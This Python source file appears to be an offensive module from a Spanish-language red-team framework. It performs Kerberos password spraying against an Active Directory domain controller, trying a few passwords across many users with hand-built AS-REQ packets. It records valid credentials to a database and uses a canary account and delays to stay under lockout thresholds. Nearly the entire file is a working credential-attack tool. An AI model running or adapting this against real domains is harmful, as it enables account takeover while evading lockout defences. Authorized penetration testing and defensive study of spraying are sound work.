# -*- coding: utf-8 -*-
"""
Módulo ad/passwd_spray
======================
Password spraying por Kerberos (T1110.003): una o pocas contraseñas
contra una lista amplia de usuarios, usando AS-REQ con PA-ENC-TIMESTAMP
(RC4-HMAC, RFC 4757) implementado a mano (MD4 puro + RC4 + HMAC-MD5).

Inspirado DIRECTAMENTE en «goteo» (suite red team propia): incluye
canario anti-bloqueo y pausa entre intentos:

    • CANARIO   : cuenta centinela; si acumula MAX_FALLOS fallos de
                  preautenticación se aborta TODO el spray (indicativo
                  de que la política de lockout está cerca).
    • PAUSA_MS  : retardo entre intentos para no saturar el KDC.

Riesgo: ALTO → exige AUTHORIZED (tienta el bloqueo de cuentas).
ATT&CK: T1110.003 (Password Spraying).
"""

import socket
import struct
import time

from core.base_module import BaseModulo, ModuloError
from core import krb5
from modules.ad.kerberos_userenum import cargar_lista


class PasswdSpray(BaseModulo):
    """Spray de contraseñas por Kerberos con canario anti-lockout."""

    NAME = "ad/passwd_spray"
    CATEGORIA = "ad"
    DESCRIPCION = ("Password spray Kerberos (AS-REQ + PA-ENC-TIMESTAMP RC4-HMAC) "
                   "con canario anti-lockout y pausa, estilo goteo. Exige AUTHORIZED.")
    RIESGO = "alto"
    AUTOR = "REDHAVOC"
    REFERENCIA = "goteo (suite propia) · MITRE ATT&CK T1110.003"
    ATTCK = ("T1110.003",)

    def definir_opciones(self) -> None:
        self.opciones.declarar("RHOST", "", True, "IP o nombre del controlador de dominio (KDC)")
        self.opciones.declarar("REINO", "", True, "Reino Kerberos en MAYÚSCULAS")
        self.opciones.declarar("USUARIOS", "", True,
                               "Lista separada por comas o fichero @ruta")
        self.opciones.declarar("CLAVES", "", True,
                               "Contraseñas a probar (comas o fichero @ruta)")
        self.opciones.declarar("CANARIO", "", False,
                               "Cuenta centinela: si acumula MAX_FALLOS se aborta")
        self.opciones.declarar("MAX_FALLOS", "2", False,
                               "Fallos del canario tolerados antes de abortar")
        self.opciones.declarar("PAUSA_MS", "300", False, "Pausa entre intentos (ms)")
        self.opciones.declarar("TCP", "false", False, "Usar TCP para el KDC")

    def ejecutar(self) -> dict:
        host = self._objetivo_host(self.opt("RHOST"))
        reino = self.opt("REINO").strip().upper()
        usuarios = cargar_lista(self.opt("USUARIOS"))
        claves = cargar_lista(self.opt("CLAVES"))
        canario = self.opt("CANARIO").strip()
        max_fallos = self.opt_int("MAX_FALLOS", 2) or 2
        pausa = (self.opt_int("PAUSA_MS", 300) or 300) / 1000.0
        tcp = self.opt_bool("TCP")
        timeout = self.opt_int("TIMEOUT", 5) or 5

        if not usuarios or not claves:
            raise ModuloError("Necesita USUARIOS y CLAVES")
        if canario and canario in usuarios:
            raise ModuloError("El canario no debe estar dentro de USUARIOS "
                              "(se sondea aparte y su fallo es una señal, no un hito)")
        if max_fallos < 1:
            raise ModuloError("MAX_FALLOS debe ser ≥ 1")

        # El canario va PRIMERO en cada ronda de contraseña
        orden = ([canario] if canario else []) + usuarios
        fallos_canario = 0
        validas = []
        intentos = 0
        abortado = ""
        resultados = []

        for clave in claves:
            if abortado:
                break
            for usuario in orden:
                intentos += 1
                es_canario = (usuario == canario)
                estado = self._probar(host, reino, usuario, clave, tcp, timeout)
                resultados.append({"usuario": usuario, "resultado": estado})

                if estado == "valida":
                    validas.append((usuario, clave))
                    db = self.workspace
                    if db is not None:
                        try:
                            db.add_cred(host, usuario, clave, servicio="kerberos")
                        except Exception:  # noqa: BLE001
                            pass
                    if es_canario:
                        # el canario NUNCA debería autenticar bien
                        abortado = (f"el canario {canario} AUTENTICÓ con '{clave}': "
                                    "¿es una cuenta real? Revisa la lista")
                        break
                elif estado == "preauth_fallida":
                    if es_canario:
                        fallos_canario += 1
                        if fallos_canario >= max_fallos:
                            abortado = (f"canario {canario} acumuló {fallos_canario} "
                                        f"falsos: abortado por política anti-lockout")
                            break
                elif estado == "bloqueado":
                    if es_canario:
                        abortado = (f"el canario {canario} está BLOQUEADO: la política "
                                    "de lockout ya se activó en intentos previos")
                        break

                if pausa:
                    time.sleep(pausa)

        db = self.workspace
        if db is not None:
            try:
                db.add_host(host, notas=f"KDC {reino}")
                db.add_service(host, 88, "KERBEROS")
            except Exception:  # noqa: BLE001 — el spray no falla por la DB
                pass

        return {
            "resumen": (f"Spray Kerberos {reino}: {intentos} intentos, "
                        f"{len(validas)} credenciales válidas"
                        + (f" · ABORTADO: {abortado}" if abortado else "")),
            "host": host,
            "reino": reino,
            "intentos": intentos,
            "validas": [{"usuario": u, "clave": c} for u, c in validas],
            "canario": canario,
            "fallos_canario": fallos_canario,
            "abortado": abortado,
            "detalle": resultados,
        }

    # ------------------------------------------------------------------
    @staticmethod
    def _probar(host: str, reino: str, usuario: str, clave: str,
                tcp: bool, timeout: int) -> str:
        """Clasifica un intento: valida / preauth_fallida / desconocido / bloqueado."""
        paquete = krb5.construir_as_req(usuario, reino, etipo=23,
                                        con_preauth=True, contrasena=clave)
        try:
            respuesta = krb5.enviar_kdc(host, paquete, timeout=timeout, tcp=tcp, puerto=88)
        except (socket.timeout, TimeoutError):
            return "timeout"
        except OSError:
            return "error_red"
        resultado = krb5.interpretar_respuesta(respuesta, usuario, reino)
        if resultado["tipo"] == "asrep":
            return "valida"
        if resultado["tipo"] == "error":
            codigo = resultado.get("codigo")
            if codigo == krb5.KDC_ERR_PREAUTH_FAILED:
                return "preauth_fallida"
            if codigo == krb5.KDC_ERR_C_PRINCIPAL_UNKNOWN:
                return "desconocido"
            if codigo == krb5.KDC_ERR_CLIENT_REVOKED:
                return "bloqueado"
            return f"error_{codigo}"
        return "ilegible"
